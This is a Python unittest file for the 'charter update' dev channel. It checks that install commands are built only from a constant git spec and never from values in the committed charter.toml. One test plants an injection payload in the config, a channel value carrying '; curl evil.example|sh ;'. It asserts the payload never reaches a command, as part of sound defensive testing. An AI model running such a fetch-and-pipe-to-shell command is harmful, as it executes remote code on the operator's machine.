"""`charter update` on the dev channel — what it installs, and what it can never install.

The stable path resolves a published version and installs `charter-cp==<version>`. The dev
path has no version to resolve: dev builds are never published, so the target is a git ref
and the requirement is a module constant.

**The single most important assertion in this file is that no value from `charter.toml`
reaches an argv.** `charter.toml` is committed and arrives from someone else's machine, and
the thing on the other end of this path is a command that installs software onto the
operator's machine. `instance.UPDATE_CHANNELS` is the closed set that makes that true;
these tests are what would go red if the install command were ever built by interpolating
anything an operator can write.

Nothing here installs anything. `util.run` is stubbed at the one seam every installer call
goes through, and the tests assert on the argv it was handed.
"""

from __future__ import annotations

import argparse
import contextlib
import os
import subprocess
import unittest
from pathlib import Path
from unittest import mock

from charter import __version__, commands_update, config, hooks, update, util
from tests._isolation import PersonaIso


@contextlib.contextmanager
def exec_trap():
    """Record every argv this process hands the operating system, however it is spelled.

    Yields the list of argvs seen.

    **Not a `util.run` counter.** Instrumenting one function pins that function's current
    spelling, not the property — this suite has already watched a `Path.stat` counter miss
    an `open()` and a `subprocess.run`. What has to be true here is about *execution*, so
    the recorder sits where every way of starting a process arrives: `subprocess.run` is
    recorded, and `Popen` plus the `os.exec*`/`spawn` family raise rather than run, so a
    refactor onto one of them fails the test instead of slipping past it.

    Residual, named rather than papered over: a C-level or `ctypes` spawn would still get
    through, and no test in this suite can see one.
    """
    seen: list[list[str]] = []

    def record(argv, *a, **kw):
        assert not kw.get("shell"), "a shell was requested on a path that must not have one"
        seen.append(list(argv))
        return subprocess.CompletedProcess(list(argv), 0, "", "")

    def refuse(*a, **kw):
        raise AssertionError(
            "a process was started by a spelling this trap does not record — the argv it "
            "was given is unexamined, which is the hole #455 was about")

    with contextlib.ExitStack() as st:
        st.enter_context(mock.patch.object(subprocess, "run", record))
        st.enter_context(mock.patch.object(subprocess, "Popen", refuse))
        for name in ("execv", "execve", "execvp", "execvpe", "posix_spawn",
                     "posix_spawnp", "spawnv", "spawnvp", "system"):
            if hasattr(os, name):
                st.enter_context(mock.patch.object(os, name, refuse))
        yield seen


class Ran:
    """A `util.run` stand-in that records argv and answers success."""

    def __init__(self, version_line=f"charter {__version__}+dev (main @ abc1234)"):
        self.calls: list[list[str]] = []
        self.version_line = version_line

    def __call__(self, cmd, cwd=None, check=True, capture=True, input=None, env=None,
                 timeout=None):
        self.calls.append(list(cmd))
        out = self.version_line if cmd[-1] == "--version" else ""
        return mock.Mock(returncode=0, stdout=out, stderr="")

    @property
    def flat(self) -> str:
        return " ".join(a for call in self.calls for a in call)


class TheDevRequirementIsAConstant(unittest.TestCase):
    def test_the_spec_is_exactly_what_the_docs_tell_you_to_type(self):
        self.assertEqual(commands_update.DEV_SPEC,
                         "git+https://github.com/diazoxide/charter@main")

    def test_the_spec_carries_no_interpolation_point_of_any_kind(self):
        """`_sync_to` builds its command with `a.format(version=…)`. A dev spec run through
        that same line would put a `str.format` call between a committed config file and an
        install command — which is why `dev_install_argv` is a separate function and why
        this asserts there is nothing in the string for a format call to reach."""
        for ch in ("{", "}", "%s", "$", "`", ";", "&", "|", "\n", " "):
            self.assertNotIn(ch, commands_update.DEV_SPEC, ch)

    def test_both_installers_pass_the_spec_as_one_argv_element(self):
        """A list argv, never a shell string — so the spec is one element and cannot be
        re-split, and `util.run` never invokes a shell to re-split it."""
        for name, argv in commands_update._DEV_INSTALLERS.items():
            with self.subTest(installer=name):
                self.assertIn(commands_update.DEV_SPEC, argv)
                self.assertEqual(sum(a == commands_update.DEV_SPEC for a in argv), 1)
                self.assertEqual(argv[0], name)

    def test_the_argv_is_a_fresh_list_not_the_tables_own(self):
        """Handed straight to `util.run`; a module-level list handed out is a list something
        can edit for the life of the process (same reason `instance.density_slots` copies)."""
        with mock.patch.object(commands_update, "installer_for", return_value=("uv", [])):
            first = commands_update.dev_install_argv()[1]
            first.append("--dangerous")
            second = commands_update.dev_install_argv()[1]
        self.assertNotIn("--dangerous", second)

    def test_the_argv_comes_back_verbatim_with_no_format_call_on_the_path(self):
        """`dev_install_argv`'s docstring says "there is no format call on this path", and
        that claim is the whole reason it is a separate function from `_sync_to`.

        Pinned with a canary, because `DEV_SPEC` deliberately carries no braces (asserted
        above): a `str.format` added to this line would be a silent no-op TODAY and a live
        interpolation point between a committed config file and an install command the day
        the spec gains a placeholder. The canary makes the mutation visible now instead.
        """
        canary = "git+https://example.invalid/{version}@{ref}"
        with mock.patch.dict(commands_update._DEV_INSTALLERS, {"uv": ["uv", canary]}), \
                mock.patch.object(commands_update, "installer_for",
                                  return_value=("uv", [])):
            self.assertEqual(commands_update.dev_install_argv()[1], ["uv", canary])

    def test_an_install_charter_does_not_own_is_named_rather_than_guessed_at(self):
        with mock.patch.object(commands_update, "installer_for",
                               return_value=("unknown", None)):
            name, argv = commands_update.dev_install_argv()
        self.assertEqual(name, "unknown")
        self.assertIsNone(argv)


class TheRunSiteRunsTheArgvItWasHanded(unittest.TestCase):
    """#455: the same claim, pinned at the site that actually executes.

    `dev_install_argv`'s docstring says there is no format call on this path, and the canary
    above proves it where the argv is BUILT. It says nothing about where the argv is RUN —
    the reviewer of PR #454 put `.format()` back into `_sync_dev` and all 4415 tests stayed
    green, because no test ever looked at what left that function.

    So the property is stated as a property of the boundary rather than of a line of code:
    **the argv charter hands the operating system on this path is, element for element, the
    argv `dev_install_argv` returned.** That is one assertion and it forbids all of it —
    interpolation, appending, re-splitting, joining into a shell string — including the
    spellings nobody has thought of yet, which is the difference between this and a list of
    forbidden characters.
    """

    def _run(self, argv):
        with mock.patch.object(commands_update, "dev_install_argv",
                               return_value=("uv", list(argv))), \
                mock.patch.object(commands_update.shutil, "which",
                                  return_value="/usr/bin/uv"), \
                exec_trap() as seen:
            commands_update._sync_dev()
        return seen

    def test_a_brace_bearing_argv_reaches_the_process_unchanged(self):
        """The canary carries the placeholders a `str.format` would consume. A format call
        added to `_sync_dev` either raises on the unknown key or rewrites the element, and
        both are visible here — where today they are invisible, because `DEV_SPEC` has no
        braces for one to bite on."""
        canary = ["uv", "tool", "install", "--force",
                  "git+https://example.invalid/{version}@{ref}"]
        self.assertEqual(self._run(canary), [canary])

    def test_nothing_is_appended_to_the_argv_on_the_way_out(self):
        """Interpolation is one way for a value to enter this command; an extra element is
        another, and the equality above forbids both. Spelled out separately because an
        appended `--index-url` is the shape that would not look like a bug in review."""
        canary = ["uv", "tool", "install", "--force", "git+https://example.invalid/x"]
        self.assertEqual(self._run(canary), [canary])

    def test_the_real_dev_install_argv_arrives_at_the_process_verbatim(self):
        """End to end, with the module's own table, against the literal string `docs`
        tells a person to type. Written out rather than compared to `DEV_SPEC` so this is
        an independent statement of what runs, not the constant agreeing with itself."""
        with mock.patch.object(commands_update, "installer_for", return_value=("uv", [])), \
                mock.patch.object(commands_update.shutil, "which",
                                  return_value="/usr/bin/uv"), \
                exec_trap() as seen:
            ok, detail = commands_update._sync_dev()
        self.assertEqual(seen, [["uv", "tool", "install", "--force",
                                 "git+https://github.com/diazoxide/charter@main"]])
        self.assertTrue(ok)

    def test_an_install_charter_does_not_own_starts_no_process_at_all(self):
        """The refusal is a refusal, not a fallback into some other command."""
        with mock.patch.object(commands_update, "dev_install_argv",
                               return_value=("unknown", None)), \
                exec_trap() as seen:
            ok, detail = commands_update._sync_dev()
        self.assertFalse(ok)
        self.assertEqual(seen, [])


class TheDevInstallRunsTheGitCommand(PersonaIso):
    def setUp(self):
        super().setUp()
        (self.tmp / "charter.toml").write_text('schema = 1\n[update]\nchannel = "dev"\n')
        config.use(self.tmp)
        self.ran = Ran()
        self.enterContext(mock.patch.object(commands_update.util, "run", self.ran))
        # The real uv argv, so `_sync_to`'s `{version}` substitution and `dev_install_argv`'s
        # constant lookup both behave exactly as they do on a machine uv owns. A stub argv
        # here would let the two paths pass while installing nothing recognisable.
        self.enterContext(mock.patch.object(
            commands_update, "installer_for",
            return_value=("uv", list(commands_update._INSTALLERS["uv"]))))
        self.enterContext(mock.patch.object(commands_update.shutil, "which",
                                            return_value="/usr/bin/x"))
        self.enterContext(mock.patch.object(commands_update, "_move_harness"))
        self.enterContext(mock.patch.object(commands_update, "_refresh_plugin"))

    def _args(self, **kw):
        return argparse.Namespace(**{"to": None, "bump": False, **kw})

    def test_it_installs_the_git_spec_and_never_a_pypi_pin(self):
        self.assertEqual(commands_update.cmd_update(self._args()), 0)
        self.assertIn(commands_update.DEV_SPEC, self.ran.flat)
        self.assertNotIn("charter-cp==", self.ran.flat)

    def test_the_word_dev_never_appears_as_an_argv_element(self):
        """The channel is COMPARED, never carried. Every element of every command charter
        runs on this path is a module constant or a path charter derived itself — and
        `"dev"` is the value that would be there if any of that stopped being true."""
        commands_update.cmd_update(self._args())
        for call in self.ran.calls:
            for element in call:
                self.assertNotEqual(element, "dev")
                self.assertNotEqual(element, "stable")

    def test_a_hostile_channel_value_never_reaches_a_command(self):
        """The end-to-end statement of the closed set: a committed charter.toml carrying an
        injection payload does not reach a command line, because it does not even reach the
        dev branch — `update_of` degraded it to `stable` at the config boundary."""
        (self.tmp / "charter.toml").write_text(
            'schema = 1\n[update]\nchannel = "dev\\" ; curl evil.example|sh ; \\""\n')
        config.use(self.tmp)
        with mock.patch.object(commands_update, "_latest", return_value=__version__), \
                mock.patch.object(commands_update, "_handoff", return_value=(True, "")):
            commands_update.cmd_update(self._args())
        self.assertNotIn("evil.example", self.ran.flat)
        self.assertNotIn("curl", self.ran.flat)
        self.assertNotIn(commands_update.DEV_SPEC, self.ran.flat)

    def test_the_plugin_is_force_refreshed_because_a_version_update_cannot_see_the_change(self):
        commands_update.cmd_update(self._args())
        commands_update._refresh_plugin.assert_called_once()

    def test_the_harness_artifact_moves_on_this_path_too(self):
        commands_update.cmd_update(self._args())
        commands_update._move_harness.assert_called_once()

    def test_the_install_is_proved_by_the_binary_reporting_a_dev_build(self):
        """A dev install cannot be verified the way the stable one is — the version number
        does not move, which is the whole reason dev builds are not published. What DOES
        change is that the binary now reports a PEP 610 dev build; a `charter --version`
        still saying plain `0.51.0` means `uv` exited 0 against something else."""
        self.ran.version_line = f"charter {__version__}"
        self.assertEqual(commands_update.cmd_update(self._args()), 1)

    def test_a_failed_install_stops_before_the_artifacts(self):
        def fail(cmd, **kw):
            self.ran.calls.append(list(cmd))
            return mock.Mock(returncode=1, stdout="", stderr="no network")

        with mock.patch.object(commands_update.util, "run", fail):
            self.assertEqual(commands_update.cmd_update(self._args()), 1)
        commands_update._move_harness.assert_not_called()
        commands_update._refresh_plugin.assert_not_called()

    def test_bump_is_refused_because_a_commit_is_not_a_pin(self):
        """`[charter] version` names a PUBLISHED release a whole team conforms to. Writing a
        commit of `main` into a committed file would put every teammate onto an unreviewed
        merge on their next session."""
        before = (self.tmp / "charter.toml").read_text()
        self.assertEqual(commands_update.cmd_update(self._args(bump=True)), 0)
        self.assertEqual((self.tmp / "charter.toml").read_text(), before)

    def test_an_explicit_target_overrides_the_channel_for_that_run(self):
        """How somebody goes back to a release without first editing charter.toml. An
        update that silently installed `main` because the plane said so would be ignoring
        the version the operator typed on the line in front of them."""
        with mock.patch.object(commands_update, "_handoff", return_value=(True, "")):
            self.assertEqual(commands_update.cmd_update(self._args(to="0.50.1")), 0)
        self.assertIn("charter-cp==0.50.1", self.ran.flat)
        self.assertNotIn(commands_update.DEV_SPEC, self.ran.flat)

    def test_a_stable_plane_is_completely_unaffected(self):
        (self.tmp / "charter.toml").write_text("schema = 1\n")
        config.use(self.tmp)
        with mock.patch.object(commands_update, "_latest", return_value="9.9.9"), \
                mock.patch.object(commands_update, "_handoff", return_value=(True, "")):
            self.assertEqual(commands_update.cmd_update(self._args()), 0)
        self.assertIn("charter-cp==9.9.9", self.ran.flat)
        self.assertNotIn(commands_update.DEV_SPEC, self.ran.flat)


class TheProbeAndCheckoutRefusalsStillHold(PersonaIso):
    """Both refusals sit ABOVE the channel branch, and both must stay there.

    A news entry's `check:` is dispatched as a charter subcommand, so a probe that reached
    the installer would reinstall the machine to answer a question about it (#314) — and
    the dev branch is a second door into the same installer. Same for a charter checkout:
    installing over the tree you are editing is never what "let me try the update command"
    meant, and it is *more* tempting to get wrong on a channel whose whole point is running
    unreleased code.

    #456 split the checkout case in two without weakening it. The CLI install still never
    happens on a checkout — that is what every test below asserts, on both channels and
    with and without an explicit target. What changed is that the plugin half, which lives
    outside the tree, is no longer refused along with it.
    """

    def setUp(self):
        super().setUp()
        (self.tmp / "charter.toml").write_text('schema = 1\n[update]\nchannel = "dev"\n')
        config.use(self.tmp)
        self.ran = Ran()
        self.enterContext(mock.patch.object(commands_update.util, "run", self.ran))
        # The CLI half, watched by name as well as by argv. `self.ran.calls` says no
        # command ran; this says the function that would have run one was never entered,
        # so a failure names WHICH guard let go rather than only that something did.
        self.sync = self.enterContext(mock.patch.object(commands_update, "_sync_dev"))
        self.sync_to = self.enterContext(mock.patch.object(commands_update, "_sync_to"))

    def _args(self, **kw):
        return argparse.Namespace(**{"to": None, "bump": False, **kw})

    @contextlib.contextmanager
    def _on_a_checkout(self, claude=True):
        from charter import doctor, plugincache
        with mock.patch.object(doctor, "_is_charter_checkout", return_value=True), \
                mock.patch.object(plugincache, "available", return_value=claude), \
                mock.patch.object(commands_update, "_refresh_plugin") as refresh, \
                mock.patch.object(commands_update, "_move_harness") as harness_:
            yield refresh, harness_

    def _installed_nothing(self):
        self.sync.assert_not_called()
        self.sync_to.assert_not_called()
        self.assertEqual(self.ran.calls, [])

    def test_a_news_probe_cannot_install_a_dev_build(self):
        from charter import news
        with mock.patch.object(news, "probing", return_value=True), \
                mock.patch.object(news, "refuse_mutation"):
            self.assertEqual(commands_update.cmd_update(self._args()), 2)
        self._installed_nothing()

    def test_a_charter_checkout_cannot_install_over_itself(self):
        """The guard #456 says must stay. The CLI is the tree; nothing is installed on it,
        on either channel and whatever else the command goes on to do."""
        for channel in ("dev", "stable"):
            with self.subTest(channel=channel):
                (self.tmp / "charter.toml").write_text(
                    f'schema = 1\n[update]\nchannel = "{channel}"\n')
                config.use(self.tmp)
                with self._on_a_checkout():
                    commands_update.cmd_update(self._args())
                self._installed_nothing()

    def test_a_dev_checkout_still_gets_the_plugin_half(self):
        """#456. `doctor`'s `plugin files` row names `charter update` as the fix and a
        maintainer reads that row standing in a checkout — so the command has to do the
        part that is safe here instead of refusing the whole thing."""
        with self._on_a_checkout() as (refresh, harness_):
            self.assertEqual(commands_update.cmd_update(self._args()), 0)
        refresh.assert_called_once()
        # NOT the harness artifact: `_move_harness` writes into the plane root, which on a
        # charter checkout is the same tree the CLI refusal is protecting.
        harness_.assert_not_called()
        self._installed_nothing()

    def test_an_explicit_target_on_a_checkout_is_still_refused_outright(self):
        """`--to X.Y.Z` asks for a published CLI to be installed, which is exactly the half
        that cannot happen here. Answering 0 and quietly doing something else would be a
        command reporting success for a thing it did not do."""
        with self._on_a_checkout() as (refresh, _):
            self.assertEqual(commands_update.cmd_update(self._args(to="0.50.1")), 2)
        refresh.assert_not_called()
        self._installed_nothing()

    def test_a_stable_checkout_is_refused_the_way_it_always_was(self):
        """`_refresh_plugin` is the dev channel's mechanism — on stable the released plugin
        is what pairs with the released CLI, which is what `doctor` says there. So this
        path has nothing safe left to do and says so, exit code and all."""
        (self.tmp / "charter.toml").write_text('schema = 1\n[update]\nchannel = "stable"\n')
        config.use(self.tmp)
        with self._on_a_checkout() as (refresh, _):
            self.assertEqual(commands_update.cmd_update(self._args()), 2)
        refresh.assert_not_called()
        self._installed_nothing()

    def test_with_no_claude_on_path_it_says_there_is_nothing_to_do(self):
        """The honest end of the same branch. A plane with no Claude Code has no plugin to
        refresh either, and reporting a refresh that did not happen is the overclaim this
        repository keeps having to unwrite."""
        with self._on_a_checkout(claude=False) as (refresh, _):
            self.assertEqual(commands_update.cmd_update(self._args()), 0)
        refresh.assert_not_called()
        self._installed_nothing()


class APinAndTheDevChannelAreNotSettledSilently(PersonaIso):
    """`hooks._autosync_version_lock` installs the pinned version at session start.

    A dev build carries the SAME version number as the release it was built from, so the
    "already conformed" equality never catches it: without this guard a plane would get one
    `charter update` to the dev channel and be quietly returned to the PyPI wheel at the
    next session start, every session, with nothing anywhere saying so.

    Reported rather than resolved, for the reason that function's own docstring gives: the
    install replaces the binary that enforces the credential guard, and session start has
    nobody to ask.
    """

    def _declare(self, text):
        (self.tmp / "charter.toml").write_text(text)
        config.use(self.tmp)

    def test_a_dev_plane_with_a_pin_installs_nothing_and_says_why(self):
        self._declare('schema = 1\n[charter]\nversion = "9.9.9"\n'
                      '[update]\nchannel = "dev"\n')
        from charter import commands
        with mock.patch.object(commands, "sync_to") as sync:
            msg = hooks._autosync_version_lock()
        sync.assert_not_called()
        self.assertIsNotNone(msg)
        self.assertIn("dev", msg)
        self.assertIn("9.9.9", msg)

    def test_a_stable_plane_with_a_pin_still_conforms(self):
        """The guard must be a branch on the channel, not a disabling of the feature."""
        self._declare('schema = 1\n[charter]\nversion = "9.9.9"\n')
        from charter import commands
        with mock.patch.object(commands, "sync_to", return_value=(True, "9.9.9")) as sync:
            msg = hooks._autosync_version_lock()
        sync.assert_called_once()
        self.assertIn("auto-updated", msg)

    def test_a_dev_plane_with_no_pin_is_silent(self):
        self._declare('schema = 1\n[update]\nchannel = "dev"\n')
        self.assertIsNone(hooks._autosync_version_lock())

    def test_a_pin_equal_to_the_running_version_is_silent_on_dev_too(self):
        """The common shape of the conflict — *pin the current release AND opt into dev* —
        and the one case the guard deliberately does not speak up about.

        The dev check sits BELOW `locked == __version__`, so a plane in this state says
        nothing. That is correct rather than a gap: a dev build carries the same version
        number as the release it was built from, so while the two agree there is nothing to
        install and nothing to undo. The moment the pin moves — a teammate bumps it after
        the next release — the equality breaks, the guard fires, and it fires at exactly
        the moment it would otherwise have reinstalled the wheel over the dev build.

        The test above uses `9.9.9`, so it never reached this case; without this one,
        moving the guard ABOVE the equality return (turning a benign state into a message
        on every single session) would have been invisible.
        """
        self._declare(f'schema = 1\n[charter]\nversion = "{__version__}"\n'
                      f'[update]\nchannel = "dev"\n')
        from charter import commands
        with mock.patch.object(commands, "sync_to") as sync:
            self.assertIsNone(hooks._autosync_version_lock())
        sync.assert_not_called()


class TheRefreshIsNeverFatal(PersonaIso):
    """`_refresh_plugin` promises "best-effort, never fatal", and by the time it runs the
    CLI has already been replaced and the harness artifact already moved.

    An exception escaping here ends a SUCCESSFUL update in a traceback — and `force_refresh`
    calls `util.run` with a 120s timeout, so `ProcTimeout` was a live path, as was a
    `claude` removed from PATH between `shutil.which` and the exec.
    """

    def _refresh_with(self, error):
        from charter import plugincache
        with mock.patch.object(plugincache, "available", return_value=True), \
                mock.patch.object(plugincache, "force_refresh", side_effect=error):
            commands_update._refresh_plugin()      # must simply return

    def test_a_timeout_out_of_force_refresh_does_not_escape(self):
        self._refresh_with(util.ProcTimeout(["claude"], 120))

    def test_a_missing_binary_does_not_escape(self):
        self._refresh_with(FileNotFoundError("claude"))

    def test_force_refresh_itself_returns_rather_than_raising_on_a_timeout(self):
        """The layer below: the guard in `_refresh_plugin` is the belt, and this is the
        braces. Both, because `plugincache.force_refresh` is also called directly."""
        from charter import plugincache
        rows = [{"id": "charter@charter", "scope": "user", "installPath": "/y"}]
        with mock.patch.object(plugincache, "available", return_value=True), \
                mock.patch.object(plugincache, "_claude_json", return_value=rows), \
                mock.patch.object(plugincache.util, "run",
                                  side_effect=util.ProcTimeout(["claude"], 120)):
            ok, detail = plugincache.force_refresh()
        self.assertFalse(ok)
        self.assertTrue(detail)


class TheSharedInstallNoteStillApplies(unittest.TestCase):
    def test_the_dev_path_reuses_the_one_note_about_a_machine_global_binary(self):
        """One binary, many planes — declaring the dev channel in one plane moves the
        charter every plane on the machine uses. That is exactly what `SHARED_INSTALL_NOTE`
        exists to say, and a second wording of it would be a second thing to keep true."""
        self.assertIn("machine-global", update.SHARED_INSTALL_NOTE)


if __name__ == "__main__":
    unittest.main()
